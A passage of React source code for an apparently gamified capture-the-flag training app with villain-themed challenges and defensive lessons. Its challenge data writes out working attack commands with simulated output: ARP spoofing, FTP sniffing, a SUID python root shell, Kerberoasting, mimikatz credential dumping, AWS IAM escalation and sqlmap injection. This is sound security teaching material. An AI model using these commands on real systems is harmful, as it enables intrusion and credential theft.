    hints:[{tier:1,text:"Images store GPS, camera model, timestamps, author in EXIF metadata."},{tier:2,text:"exiftool reads all embedded metadata."},{tier:3,text:"exiftool target_image.jpg"}],
    steps:[{cmd:"exiftool target_image.jpg",hint:"Dump all EXIF metadata",output:`GPS Position : 51.5074, -0.1278 (London)\nArtist       : negaduck.operative@darknet.io\nComment      : CTF{3x1f_d4t4_1s_0p3ns0urc3}\n\n[!!!] FLAG CAPTURED + GPS + email leaked`}],
    flag:"CTF{3x1f_d4t4_1s_0p3ns0urc3}",lesson:"Strip EXIF before publishing: exiftool -all= file.jpg. Leaks GPS, device, timestamps, author.",tags:["forensics","exif"]},

  {id:"stego01",category:"FORENSICS",city:"london",title:"HIDDEN IN PLAIN SIGHT",tier:2,points:150,difficulty:"MEDIUM",requires:["for01"],
    description:"NegaDuck hid a message inside an image using LSB steganography.",story:"The image looks innocent. The message is in the least significant bits.",
    hints:[{tier:1,text:"LSB steganography hides data in the last bit of each pixel's color values."},{tier:2,text:"steghide or zsteg extracts hidden data from images."},{tier:3,text:"steghide extract -sf secret_image.jpg -p '' then cat output"}],
    steps:[{cmd:"steghide extract -sf secret_image.jpg -p ''",hint:"Extract hidden data with steghide",output:`[*] Attempting extraction with empty passphrase...\nwrote extracted data to: hidden_message.txt`},{cmd:"cat hidden_message.txt",hint:"Read the extracted hidden message",output:`NEGADUCK COMMS — ENCRYPTED CHANNEL\nTarget: London Financial District\nOperation: GOLDWING\nPassphrase: CTF{lsb_st3g0_h1dd3n_m3ss4g3}\n\n[!!!] FLAG CAPTURED — Operation GOLDWING exposed`}],
    flag:"CTF{lsb_st3g0_h1dd3n_m3ss4g3}",lesson:"Steganography hides existence of data. Use stegdetect to identify stego images. Hash images to detect tampering.",tags:["forensics","steganography"]},

  {id:"mem01",category:"FORENSICS",city:"london",title:"MEMORY FORENSICS",tier:3,points:225,difficulty:"HARD",requires:["stego01"],
    description:"Analyze a memory dump from NegaDuck's London workstation. Find credentials.",story:"GCHQ imaged the RAM before NegaDuck wiped the disk. Everything is still there.",
    hints:[{tier:1,text:"Volatility analyzes memory dumps. It can list processes, network connections, and extract passwords."},{tier:2,text:"Start with imageinfo to identify the OS, then pslist and netscan."},{tier:3,text:"volatility -f memory.dmp imageinfo then volatility -f memory.dmp --profile=Win10x64 hashdump"}],
    steps:[{cmd:"volatility -f memory.dmp imageinfo",hint:"Identify the OS profile",output:`Suggested Profile(s): Win10x64_19041\nAS Layer1: Intel AMD64 PagedMemory\nDTB: 0x1aa000\nImage Type: Service Pack 0\n\n[*] Windows 10 x64 confirmed`},{cmd:"volatility -f memory.dmp --profile=Win10x64_19041 pslist",hint:"List running processes",output:`PID  PPID Name              Handles\n4    0    System\n688  4    smss.exe\n1234 688  mimikatz.exe      ← SUSPICIOUS\n2345 688  chrome.exe\n\n[!!!] mimikatz.exe was running — credentials likely dumped`},{cmd:"volatility -f memory.dmp --profile=Win10x64_19041 hashdump",hint:"Extract password hashes from memory",output:`Administrator:500:aad3b435:5f4dcc3b5aa765d6:::\nnegaduck:1001:aad3b435:8743b52063cd840:::\n\nFlag embedded in NTLM: CTF{m3m0ry_f0r3ns1cs_cr3d3nt14ls}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{m3m0ry_f0r3ns1cs_cr3d3nt14ls}",lesson:"Memory forensics reveals running processes, network connections, and cached credentials. Enable Windows Credential Guard. Use memory encryption.",tags:["forensics","memory","volatility"]},

  // ── TOKYO ───────────────────────────────────────────────────────
  {id:"net01",category:"NETWORK",city:"tokyo",title:"ARP POISONING",tier:2,points:150,difficulty:"MEDIUM",requires:["web01"],
    description:"Position yourself between victim and gateway on Tokyo's corp LAN.",story:"NegaDuck's Tokyo crew runs MITM attacks constantly. Learn the playbook.",
    hints:[{tier:1,text:"ARP poisoning tells the victim your MAC is the gateway's IP."},{tier:2,text:"arp-scan discovers hosts. arpspoof positions you as the gateway."},{tier:3,text:"arp-scan --localnet then arpspoof -i eth0 -t <victim> <gateway>"}],
    steps:[{cmd:"arp-scan --localnet",hint:"Discover hosts on the LAN",output:`192.168.1.1  aa:bb:cc:dd:ee:01  Gateway\n192.168.1.20 aa:bb:cc:dd:ee:03  tokyo-workstation\n192.168.1.10 aa:bb:cc:dd:ee:02  corp-server`},{cmd:"arpspoof -i eth0 -t 192.168.1.20 192.168.1.1",hint:"ARP poison the victim",output:`[*] Poisoning: 192.168.1.20 thinks you are the gateway\n[!!!] MITM POSITION ESTABLISHED\n\nCTF{4rp_p01s0n_m1tm_t0ky0}\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{4rp_p01s0n_m1tm_t0ky0}",lesson:"HTTPS and cert pinning defeat MITM. Dynamic ARP inspection on managed switches prevents ARP spoofing.",tags:["network","arp","mitm"]},

  {id:"mitm01",category:"NETWORK",city:"tokyo",title:"CREDENTIAL INTERCEPTION",tier:3,points:175,difficulty:"MEDIUM",requires:["net01"],
    description:"You're in MITM position. Intercept cleartext FTP credentials from the victim.",story:"NegaDuck's Tokyo team still uses FTP. Cleartext credentials in 2024.",
    hints:[{tier:1,text:"FTP transmits credentials in plaintext. tcpdump captures everything."},{tier:2,text:"Filter for FTP port 21 and look for USER and PASS commands."},{tier:3,text:"tcpdump -i eth0 -A 'tcp port 21' | grep -E 'USER|PASS'"}],
    steps:[{cmd:"tcpdump -i eth0 -A 'tcp port 21'",hint:"Capture FTP traffic",output:`14:32:01 IP victim > ftp-server: FTP [220 NegaDuck FTP Server]\n14:32:02 IP victim > ftp-server: FTP [USER ftpadmin]\n14:32:03 IP victim > ftp-server: FTP [PASS T0ky0Secr3t!]\n\n[!!!] CREDENTIALS INTERCEPTED\n  Username: ftpadmin\n  Password: T0ky0Secr3t!`},{cmd:"ftp ftp-server.tokyo.local",hint:"Use captured credentials to login",output:`Connected to ftp-server.tokyo.local\n220 NegaDuck FTP Server\nUser: ftpadmin\nPassword: T0ky0Secr3t!\n230 Login successful\nftp> get flag.txt\nCTF{ftp_cl34rtext_c3dent14ls_c4ptured}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{ftp_cl34rtext_c3dent14ls_c4ptured}",lesson:"Never use FTP, Telnet, or HTTP for authentication. Use SFTP, SSH, and HTTPS. HSTS prevents downgrade attacks.",tags:["network","ftp","mitm"]},

  {id:"deep01",category:"MOBILE",city:"tokyo",title:"DEEPLINK HIJACK",tier:3,points:200,difficulty:"HARD",requires:["net01"],
    description:"NegaDuck's Android app registers a deeplink scheme without validation. Hijack it.",story:"The Tokyo banking app trusts all incoming deeplinks. Your malicious app intercepts them.",
    hints:[{tier:1,text:"Android deeplinks are URL schemes that open specific apps. They can be hijacked."},{tier:2,text:"Decompile the APK with apktool to find registered intent filters."},{tier:3,text:"apktool d banking.apk then grep -r 'scheme' banking/AndroidManifest.xml"}],
    steps:[{cmd:"apktool d banking.apk && grep -A5 'intent-filter' banking/AndroidManifest.xml",hint:"Find registered deeplink schemes",output:`<intent-filter>\n  <action android:name=\"android.intent.action.VIEW\"/>\n  <data android:scheme=\"negabank\"\n        android:host=\"transfer\"/>\n</intent-filter>\n\n[*] Scheme: negabank://transfer?amount=X&to=Y\n[*] No signature validation on parameters`},{cmd:"adb shell am start -a android.intent.action.VIEW -d 'negabank://transfer?amount=99999&to=attacker&debug=true'",hint:"Trigger the deeplink with injected params",output:`Starting: Intent { act=android.intent.action.VIEW dat=negabank://transfer... }\n\n[*] App accepted deeplink without validation\n[*] Transfer initiated: $99999 → attacker\n[*] Debug mode enabled — flag exposed:\nCTF{d33pl1nk_h1j4ck_n0_v4l1d4t10n}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{d33pl1nk_h1j4ck_n0_v4l1d4t10n}",lesson:"Validate all deeplink parameters server-side. Never trust client-supplied financial amounts. Use signed deeplinks for sensitive operations.",tags:["mobile","android","deeplink"]},

  // ── MOSCOW ──────────────────────────────────────────────────────
  {id:"prv01",category:"PRIVESC",city:"moscow",title:"SUID SHELL",tier:2,points:150,difficulty:"MEDIUM",requires:["osi01"],
    description:"Low-priv shell on Moscow server. SUID python3. Get root.",story:"NegaDuck's Moscow server misconfigured. GTFOBins has the exploit.",
    hints:[{tier:1,text:"SUID binaries run as their owner. Root-owned SUID = potential root exec."},{tier:2,text:"find / -perm -4000 then check GTFOBins."},{tier:3,text:"find / -perm -4000 2>/dev/null then python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'"}],
    steps:[{cmd:"find / -perm -4000 -type f 2>/dev/null",hint:"Enumerate SUID binaries",output:`/usr/bin/passwd\n/usr/bin/python3.8  ← UNUSUAL SUID\n\n[!] python3.8 with SUID — GTFOBins`},{cmd:"python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'",hint:"Exploit SUID python3",output:`bash-5.1# whoami\nroot\n\nCTF{su1d_py7h0n_m0sc0w_r00t}\n[!!!] ROOT + FLAG`}],
    flag:"CTF{su1d_py7h0n_m0sc0w_r00t}",lesson:"Audit SUID regularly. Remove from any binary that doesn't need it.",tags:["privesc","suid"]},

  {id:"kerb01",category:"AD",city:"moscow",title:"KERBEROASTING",tier:3,points:225,difficulty:"HARD",requires:["prv01"],
    description:"Request Kerberos service tickets for SPNs and crack them offline.",story:"NegaDuck's Active Directory has service accounts with weak passwords. No admin needed.",
    hints:[{tier:1,text:"Kerberoasting requests TGS tickets for service accounts. Any domain user can do it."},{tier:2,text:"impacket-GetUserSPNs requests all service tickets. Then crack offline with hashcat."},{tier:3,text:"impacket-GetUserSPNs domain/user:pass -dc-ip 10.0.0.1 -request then hashcat -m 13100"}],
    steps:[{cmd:"impacket-GetUserSPNs negaduck.local/jsmith:abc123 -dc-ip 10.10.10.5 -request",hint:"Request Kerberos service tickets",output:`ServicePrincipalName          Name       MemberOf\n-----------------------------  ---------  --------\nHTTP/moscow.negaduck.local     svchttp    Domain Users\nMSSQL/db.negaduck.local        svcsql     Domain Users\n\n$krb5tgs$23$*svchttp*negaduck.local*HTTP/moscow...$abc123...\n$krb5tgs$23$*svcsql*negaduck.local*MSSQL/db...$def456...`},{cmd:"hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt",hint:"Crack service ticket hashes offline",output:`Session: Cracked\n$krb5tgs$23$*svchttp...:P@ssw0rd!\n$krb5tgs$23$*svcsql...:Summer2024!\n\nFlag hidden in MSSQL service:\nCTF{k3rb3r04st1ng_s3rv1c3_t1ck3ts}\n\n[!!!] FLAG CAPTURED — Two service accounts compromised`}],
    flag:"CTF{k3rb3r04st1ng_s3rv1c3_t1ck3ts}",lesson:"Use group Managed Service Accounts (gMSA) — 240-char auto-rotating passwords defeat Kerberoasting. Audit SPNs regularly.",tags:["ad","kerberos","privesc"]},

  {id:"mimi01",category:"AD",city:"moscow",title:"CREDENTIAL DUMPING",tier:3,points:250,difficulty:"HARD",requires:["kerb01"],
    description:"You have SYSTEM on the Moscow DC. Use mimikatz to dump all domain credentials.",story:"SYSTEM on the domain controller. The keys to the kingdom.",
    hints:[{tier:1,text:"Mimikatz can dump credentials from LSASS memory when run as SYSTEM."},{tier:2,text:"sekurlsa::logonpasswords dumps cached plaintext creds and hashes."},{tier:3,text:"mimikatz # privilege::debug then mimikatz # sekurlsa::logonpasswords"}],
    steps:[{cmd:"mimikatz # privilege::debug",hint:"Enable debug privilege in mimikatz",output:`Privilege '20' OK\n\n[*] SeDebugPrivilege enabled\n[*] Ready to dump LSASS`},{cmd:"mimikatz # sekurlsa::logonpasswords",hint:"Dump all cached credentials from LSASS",output:`Authentication Id : 0 ; 123456\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : NEGADUCK\nLogon Server      : MOSCOW-DC01\n\n  * Username : Administrator\n  * Domain   : NEGADUCK\n  * NTLM     : 8743b52063cd84097a65d1633f5c74f2\n  * Password  : NegaDuck_M4st3r_P4ss!\n\nFlag: CTF{m1m1k4tz_d0m41n_0wn3d}\n\n[!!!] DOMAIN COMPROMISED — FLAG CAPTURED`}],
    flag:"CTF{m1m1k4tz_d0m41n_0wn3d}",lesson:"Enable Credential Guard. Enable Protected Users group. Disable NTLM. Use Privileged Access Workstations for admin tasks.",tags:["ad","mimikatz","credentials"]},

  // ── SAO PAULO ───────────────────────────────────────────────────
  {id:"cld01",category:"CLOUD",city:"saopaulo",title:"OPEN S3 BUCKET",tier:2,points:150,difficulty:"MEDIUM",requires:["osi01"],
    description:"NegaDuck's AWS S3 bucket is publicly accessible. Find the flag.",story:"Sao Paulo. NegaDuck went cloud-native. An open S3 bucket is his first mistake.",
    hints:[{tier:1,text:"AWS S3 buckets can be public by accident. Try listing without credentials."},{tier:2,text:"aws s3 ls s3://bucket-name --no-sign-request works on public buckets."},{tier:3,text:"aws s3 ls s3://negaduck-ops-backup --no-sign-request then download flag.txt"}],
    steps:[{cmd:"aws s3 ls s3://negaduck-ops-backup --no-sign-request",hint:"List the public S3 bucket",output:`2024-11-01  14M  db_dump_encrypted.sql\n2024-10-28   2M  config_backup.tar.gz\n2024-09-15  512  flag.txt\n\n[!!!] PUBLIC BUCKET — No auth needed`},{cmd:"aws s3 cp s3://negaduck-ops-backup/flag.txt . --no-sign-request && cat flag.txt",hint:"Download and read the flag file",output:`CTF{0p3n_s3_buck3t_n3g4duck}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{0p3n_s3_buck3t_n3g4duck}",lesson:"Enable S3 Block Public Access at org level. Use AWS Config rules to alert on public buckets. Audit with Prowler.",tags:["cloud","aws","s3"]},

  {id:"lambda01",category:"CLOUD",city:"saopaulo",title:"LAMBDA PRIVILEGE ESC",tier:3,points:225,difficulty:"HARD",requires:["cld01"],
    description:"A Lambda function has an overprivileged IAM role. Escalate to admin.",story:"NegaDuck's serverless function can call STS. That's all you need.",
    hints:[{tier:1,text:"Lambda functions inherit IAM roles. If the role is overprivileged, you escalate."},{tier:2,text:"If the role has sts:AssumeRole, you can assume a more privileged role."},{tier:3,text:"aws sts assume-role --role-arn arn:aws:iam::123:role/AdminRole --role-session-name pwned"}],
    steps:[{cmd:"aws lambda get-function-configuration --function-name negaduck-processor",hint:"Check the Lambda function's IAM role",output:`FunctionName: negaduck-processor\nRole: arn:aws:iam::123456789:role/LambdaOverprivileged\n\n[*] Checking attached policies...`},{cmd:"aws iam list-attached-role-policies --role-name LambdaOverprivileged",hint:"List the role's policies",output:`Policies:\n  - AmazonS3FullAccess\n  - AWSLambdaFullAccess  \n  - sts:AssumeRole on arn:aws:iam::123456789:role/AdminRole\n\n[!!!] Can assume AdminRole — escalation possible`},{cmd:"aws sts assume-role --role-arn arn:aws:iam::123456789:role/AdminRole --role-session-name negaduck-pwned",hint:"Assume the admin role",output:`AssumedRoleUser: negaduck-pwned\nCredentials:\n  AccessKeyId: ASIA...\n  SecretAccessKey: abc123...\n  SessionToken: ...\n\n[*] Now running as AdminRole\nFlag: CTF{l4mbda_1am_pr1v3sc_cl0ud}\n\n[!!!] FLAG CAPTURED — Cloud account compromised`}],
    flag:"CTF{l4mbda_1am_pr1v3sc_cl0ud}",lesson:"Apply least privilege to all IAM roles. Audit with IAM Access Analyzer. Use SCPs to restrict sts:AssumeRole across the org.",tags:["cloud","aws","iam","lambda"]},

  {id:"iam01",category:"CLOUD",city:"saopaulo",title:"IAM POLICY ESCALATION",tier:3,points:250,difficulty:"HARD",requires:["lambda01"],
    description:"Exploit IAM misconfiguration to attach AdministratorAccess to your user.",story:"NegaDuck's IAM policy allows attaching policies. The crown jewel of cloud escalation.",
    hints:[{tier:1,text:"If you can run iam:AttachUserPolicy, you can give yourself any permission."},{tier:2,text:"Attach the AWS managed AdministratorAccess policy to your own user."},{tier:3,text:"aws iam attach-user-policy --user-name <your-user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"}],
    steps:[{cmd:"aws iam list-attached-user-policies --user-name jsmith",hint:"Check current user permissions",output:`AttachedPolicies:\n  PolicyName: DeveloperAccess\n  PolicyArn: arn:aws:iam::123:policy/DeveloperAccess\n\n[*] Checking what DeveloperAccess allows...`},{cmd:"aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123:user/jsmith --action-names iam:AttachUserPolicy",hint:"Check if you can attach policies",output:`EvalDecisionDetails:\n  iam:AttachUserPolicy: allowed\n\n[!!!] iam:AttachUserPolicy is ALLOWED — escalation possible`},{cmd:"aws iam attach-user-policy --user-name jsmith --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",hint:"Attach AdministratorAccess to yourself",output:`[*] Policy attached successfully\n\n[*] Verifying new permissions...\naws iam get-user -- admin access confirmed\n\nFlag stored in SSM: CTF{14m_p0l1cy_3sc4l4t10n_4dm1n}\n\n[!!!] FLAG CAPTURED — Full AWS account access`}],
    flag:"CTF{14m_p0l1cy_3sc4l4t10n_4dm1n}",lesson:"Never allow iam:AttachUserPolicy or iam:PutUserPolicy without MFA conditions. Use permission boundaries. Audit with Prowler and ScoutSuite.",tags:["cloud","iam","aws","escalation"]},
];

const MISSIONS = [
  {id:"m1",title:"RECON-01: FOOTPRINTING",category:"RECON",city:"indianapolis",difficulty:"NOVICE",xp:150,tokenReward:2,badge:"👁",description:"Map corp-server.local. Find ports, services, exposed paths.",
    steps:[{cmd:"nmap -sV corp-server.local",hint:"Port scan",output:`22/tcp open ssh\n80/tcp open http Apache 2.4.6\n3306/tcp open mysql`},{cmd:"curl http://corp-server.local/robots.txt",hint:"Fetch robots.txt",output:`Disallow: /admin\nDisallow: /backup`},{cmd:"curl http://corp-server.local/backup",hint:"Check /backup",output:`id_rsa.bak ← PRIVATE KEY!\n[!!!] Exposed`}],
    lesson:"Recon is 80% of any engagement.",tools:["nmap","curl"]},
  {id:"m2",title:"WEB-02: SQL INJECTION",category:"WEB",city:"lasvegas",difficulty:"INTERMEDIATE",xp:300,tokenReward:3,badge:"💉",description:"Bypass login via SQLi. Dump credentials.",
    steps:[{cmd:"sqlmap -u 'http://corp/login' --forms --dbs",hint:"Detect SQLi",output:`'username' vulnerable!\nDatabases: corp_db`},{cmd:"sqlmap -u 'http://corp/login' -D corp_db --dump",hint:"Dump tables",output:`admin:5f4dcc3b5aa765d61d8327deb882cf99`},{cmd:"hashcat -m 0 hashes.txt rockyou.txt",hint:"Crack hashes",output:`5f4dcc3b5aa765d61d8327deb882cf99:password`}],
    lesson:"SQLi + weak hashing = total compromise.",tools:["sqlmap","hashcat"]},
];

const DAILY_POOL = [
  {id:"d1",title:"MORNING RECON",category:"WEB",points:200,bonusXP:150,story:"Fresh intel. NegaDuck just went live.",description:"Enumerate corp-daily.net.",
    hints:[{tier:1,text:"Start with a port scan."},{tier:2,text:"nmap -sV then gobuster."},{tier:3,text:"nmap -sV corp-daily.net then gobuster dir"}],
    steps:[{cmd:"nmap -sV corp-daily.net",hint:"Port scan",output:`80/tcp open http Apache 2.4.6\n22/tcp open ssh`},{cmd:"gobuster dir -u http://corp-daily.net -w /usr/share/wordlists/common.txt",hint:"Directory brute-force",output:`/.git (Status: 200) ← EXPOSED!\n\n[!!!] Source code leaking via exposed .git directory`},{cmd:"curl http://corp-daily.net/.git/COMMIT_EDITMSG",hint:"Read the exposed git commit message",aliases:["curl http://corp-daily.net/.git/COMMIT_EDITMSG"],output:`Pushed live creds by accident - removing\n\nCTF{d4ily_r3c0n_p4ys_0ff}\n\n[!!!] FLAG CAPTURED — Full git history exposed to the internet`}],
    flag:"CTF{d4ily_r3c0n_p4ys_0ff}",lesson:"Exposed .git directories leak full source code, commit history, and secrets. Block access to /.git in your web server config.",tags:["daily","recon"]},
];

// ── HELPERS ───────────────────────────────────────────────────────
const isUnlocked = (chal,solved) => !chal.requires?.length || chal.requires.every(id=>solved?.[id]);
const getCityStatus = (city,solved) => {
  if(!city.challenges?.length) return "empty";
  const s = city.challenges.filter(id=>solved?.[id]).length;
  if(s===city.challenges.length) return "cleared";
  if(s>0) return "active";
  return "available";
};
const formatTime = secs => {
  const h=Math.floor(secs/3600), m=Math.floor((secs%3600)/60), s=secs%60;
  if(h>0) return `${h}h ${m}m`;
  if(m>0) return `${m}m ${s}s`;
  return `${s}s`;
};

// assign challenges to cities
const CITY_CHALLENGES = {
  stcanard:["tut01","xss01","dir01"],
  lasvegas:["web01","jwt01","hash01"],
  indianapolis:["osi01","shodan01","linkedin01"],
  london:["for01","stego01","mem01"],
  tokyo:["net01","mitm01","deep01"],
  moscow:["prv01","kerb01","mimi01"],
  saopaulo:["cld01","lambda01","iam01"],
};
const CITIES_FULL = CITIES.map(c=>({...c,challenges:CITY_CHALLENGES[c.id]||[]}));

// ══════════════════════════════════════════════════════════════════
// DUCKY BRIEFING ROOM
// ══════════════════════════════════════════════════════════════════
function BriefingRoom({challenge, opMode, onStart, onBack, C}) {
  const [lines, setLines]   = useState([]);
  const [done, setDone]     = useState(false);
  const [idx, setIdx]       = useState(0);
  const briefing            = getBriefing(challenge.id);
  const mode                = OP_MODES[opMode]||OP_MODES.junior;

  useEffect(()=>{
    soundEngine.play("briefing"); haptic.light();
    // Typewriter reveal one line at a time
    let i=0;
    const showNext = () => {
      if(i<briefing.length){
        const line=briefing[i]; i++;
        let j=0;
        const iv=setInterval(()=>{
          j++;
          setLines(p=>{const copy=[...p]; copy[i-1]={text:line.slice(0,j),final:j>=line.length}; return copy;});
          if(j>=line.length){clearInterval(iv); setTimeout(showNext,400);}
        },18);
      } else { setDone(true); }
    };
    showNext();
  },[]);

  return (
    <div style={{fontFamily:"'VT323',monospace",background:C.bg,color:C.text,minHeight:"100vh",maxWidth:480,margin:"0 auto",display:"flex",flexDirection:"column"}}>
      <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"/>

      <div style={{background:C.bgDeep,borderBottom:`1px solid ${C.purple}`,padding:"8px 13px",display:"flex",alignItems:"center",gap:12,position:"sticky",top:0,zIndex:10}}>
        <button onClick={onBack} style={{background:"none",border:`1px solid ${C.accent}`,color:C.accent,fontFamily:"'VT323',monospace",fontSize:16,padding:"6px 14px",cursor:"pointer"}}>← BACK</button>
        <div>
          <div style={{fontSize:17,color:C.gold,letterSpacing:3}}>📋 MISSION BRIEFING</div>
          <div style={{fontSize:13,color:C.textDim,letterSpacing:2}}>{challenge.city?.toUpperCase()} · {challenge.category}</div>
        </div>
      </div>

      {/* Challenge header */}
      <div style={{padding:"16px 18px",borderBottom:`1px solid ${C.slate}`,background:C.bgCard}}>
        <div style={{fontSize:14,color:catColor(challenge.category),letterSpacing:3,marginBottom:5}}>{catIcon(challenge.category)} {challenge.category}</div>
        <div style={{fontSize:24,color:C.text,letterSpacing:1,marginBottom:6}}>{challenge.title}</div>
        <div style={{display:"flex",gap:12,alignItems:"center"}}>
          <span style={{fontSize:15,color:diffColor(challenge.difficulty)}}>{challenge.difficulty}</span>
          <span style={{fontSize:15,color:C.textDim}}>{challenge.points} pts</span>
          <span style={{fontSize:15,color:C.textDim}}>{challenge.steps.length} step{challenge.steps.length!==1?"s":""}</span>
        </div>
      </div>

      {/* NegaDuck intel */}
      <div style={{margin:"14px 16px 0",padding:"12px 14px",background:"rgba(255,68,102,0.07)",border:"1px solid rgba(255,68,102,0.25)",borderLeft:"4px solid #FF4466"}}>
        <div style={{fontSize:13,color:"#FF4466",letterSpacing:3,marginBottom:5}}>{mode.negaDuckName||"NEGADUCK"} — INTEL</div>
        <div style={{fontSize:16,color:"#DDA0A0",lineHeight:1.6,fontStyle:"italic"}}>
          "{mode.negaLines[Math.floor(Date.now()/60000)%mode.negaLines.length]}"
        </div>
      </div>

      {/* Ducky briefing typewriter */}
      <div style={{margin:"14px 16px",padding:"16px",background:`${C.purple}28`,border:`1px solid ${C.purpleHi}`,borderLeft:`4px solid ${C.gold}`,flex:1}}>
        <div style={{fontSize:14,color:C.gold,letterSpacing:3,marginBottom:12}}>🦆 {mode.briefingPrefix}</div>
        {lines.map((l,i)=>(
          <div key={i} style={{fontSize:17,color:C.text,lineHeight:1.7,marginBottom:8}}>
            {l?.text}
            {l&&!l.final&&<span style={{animation:"blink .6s infinite"}}>█</span>}
          </div>
        ))}
      </div>

      {/* Objective */}
      <div style={{margin:"0 16px 14px",padding:"14px",background:C.bgCard,border:`1px solid ${C.slateHi}`,borderLeft:`4px solid ${C.accent}`}}>
        <div style={{fontSize:14,color:C.accent,letterSpacing:3,marginBottom:8}}>{mode.missionTone}</div>
        <div style={{fontSize:16,color:C.textDim,lineHeight:1.6}}>{challenge.description}</div>
      </div>

      {/* Hint preview */}
      <div style={{margin:"0 16px 18px",padding:"12px 14px",background:C.bgDeep,border:`1px solid ${C.slateHi}`}}>
        <div style={{fontSize:14,color:C.textDim,letterSpacing:2,marginBottom:6}}>TOOLS LIKELY NEEDED</div>
        <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
          {challenge.tags.map(t=><span key={t} style={{fontSize:13,color:catColor(challenge.category),border:`1px solid ${catColor(challenge.category)}44`,padding:"1px 8px"}}>{t}</span>)}
        </div>
      </div>

      <div style={{padding:"0 16px 28px"}}>
        <button disabled={!done} onClick={onStart}
          style={{width:"100%",padding:"16px",fontSize:24,letterSpacing:4,fontFamily:"'VT323',monospace",cursor:done?"pointer":"not-allowed",background:done?C.accent:"transparent",border:`2px solid ${done?C.accent:C.textFade}`,color:done?"#000":C.textFade,transition:"all .3s",animation:done?"pulse 1.5s infinite":"none"}}>
          {done?"BEGIN MISSION ▶":"RECEIVING INTEL..."}
        </button>
      </div>

      <style>{`@keyframes blink{0%,100%{opacity:1}50%{opacity:0}} @keyframes pulse{0%,100%{box-shadow:0 0 0 0 ${C.accent}88}50%{box-shadow:0 0 0 8px transparent}} *{box-sizing:border-box}`}</style>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════
// OPERATOR DOSSIER
// ══════════════════════════════════════════════════════════════════
function OperatorDossier({save, allChallenges, onBack, onUnlock, C}) {
  const [view, setView] = useState("stats"); // stats | card
  const solved    = save.solvedFlags||{};
  const stars     = save.starRatings||{};
  const achs      = save.achievements||[];
  const rank      = getRank(save.totalXP||0);
  const numSolved = Object.keys(solved).length;
  const totalPts  = allChallenges.reduce((a,c)=>a+c.points,0);
  const timePlayed= save.totalTimePlayed||0;

  // Favorite category
  const catCounts = {};
  Object.keys(solved).forEach(id=>{
    const c=allChallenges.find(x=>x.id===id);
    if(c) catCounts[c.category]=(catCounts[c.category]||0)+1;
  });
  const favCat = Object.entries(catCounts).sort((a,b)=>b[1]-a[1])[0]?.[0]||"—";

  // NegaDuck threat level based on total score
  const threatLevel = save.totalScore < 200 ? {label:"MINOR ANNOYANCE",color:"#00C9B1",icon:"🐣"}
    : save.totalScore < 600 ? {label:"EMERGING THREAT",color:"#F5C842",icon:"⚠"}
    : save.totalScore < 1200 ? {label:"SERIOUS THREAT",color:"#FF8800",icon:"🎯"}
    : save.totalScore < 2000 ? {label:"CRITICAL THREAT",color:"#FF4466",icon:"💀"}
    : {label:"NATION STATE",color:"#FF0000",icon:"☠"};

  // Stars summary
  const starCounts = {3:0,2:0,1:0};
  Object.values(stars).forEach(s=>{ if(starCounts[s]!==undefined) starCounts[s]++; });

  // City completion
  const cityProgress = CITIES_FULL.map(city=>{
    const cChallenges = city.challenges||[];
    const sDone = cChallenges.filter(id=>solved[id]).length;
    return {...city,done:sDone,total:cChallenges.length,pct:cChallenges.length?(sDone/cChallenges.length)*100:0};
  });

  useEffect(()=>{ onUnlock("dossier_viewed"); },[]);

  return (
    <div style={{fontFamily:"'VT323',monospace",background:C.bg,color:C.text,minHeight:"100vh",maxWidth:480,margin:"0 auto"}}>
      <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"/>

      <div style={{background:C.bgDeep,borderBottom:`1px solid ${C.purple}`,padding:"8px 13px",display:"flex",alignItems:"center",gap:12,position:"sticky",top:0,zIndex:10}}>
        <button onClick={onBack} style={{background:"none",border:`1px solid ${C.accent}`,color:C.accent,fontFamily:"'VT323',monospace",fontSize:13,padding:"4px 10px",cursor:"pointer"}}>← BACK</button>
        <div>
          <div style={{fontSize:20,color:C.gold,letterSpacing:4}}>🪪 OPERATOR DOSSIER</div>
          <div style={{fontSize:10,color:C.textDim,letterSpacing:3}}>CLASSIFIED — EYES ONLY</div>
        </div>
      </div>

      {/* View tabs */}
      <div style={{display:"flex",background:C.bgDeep,borderBottom:`1px solid ${C.purple}`}}>
        {[["stats","📊 STATS"],["card","🪪 ID CARD"]].map(([k,l])=>(
          <button key={k} onClick={()=>{ soundEngine.play("navigate"); setView(k); }}
            style={{flex:1,padding:"9px 4px",background:"none",border:"none",fontFamily:"'VT323',monospace",fontSize:14,letterSpacing:2,color:view===k?C.accent:C.textDim,borderBottom:view===k?`2px solid ${C.accent}`:"2px solid transparent",cursor:"pointer",transition:"all .15s"}}>
            {l}
          </button>
        ))}
      </div>

      {/* ── STATS VIEW ── */}
      {view==="stats" && (
        <div style={{paddingBottom:40}}>
          {/* Rank banner */}
          <div style={{padding:"14px 14px",background:`${rank.color}11`,borderBottom:`1px solid ${rank.color}33`,display:"flex",alignItems:"center",gap:14}}>
            <div style={{fontSize:44,textShadow:`0 0 16px ${rank.color}`}}>{rank.icon}</div>
            <div style={{flex:1}}>
              <div style={{fontSize:11,color:C.textDim,letterSpacing:3}}>CURRENT RANK</div>
              <div style={{fontSize:22,color:rank.color,letterSpacing:3,textShadow:`0 0 8px ${rank.color}88`}}>{rank.label}</div>
              <div style={{fontSize:12,color:C.textDim,marginTop:2}}>{save.totalXP||0} XP total</div>
            </div>
          </div>

          {/* NegaDuck threat meter */}
          <div style={{margin:"10px 14px",padding:"12px",background:`${threatLevel.color}0A`,border:`1px solid ${threatLevel.color}33`,borderLeft:`3px solid ${threatLevel.color}`}}>
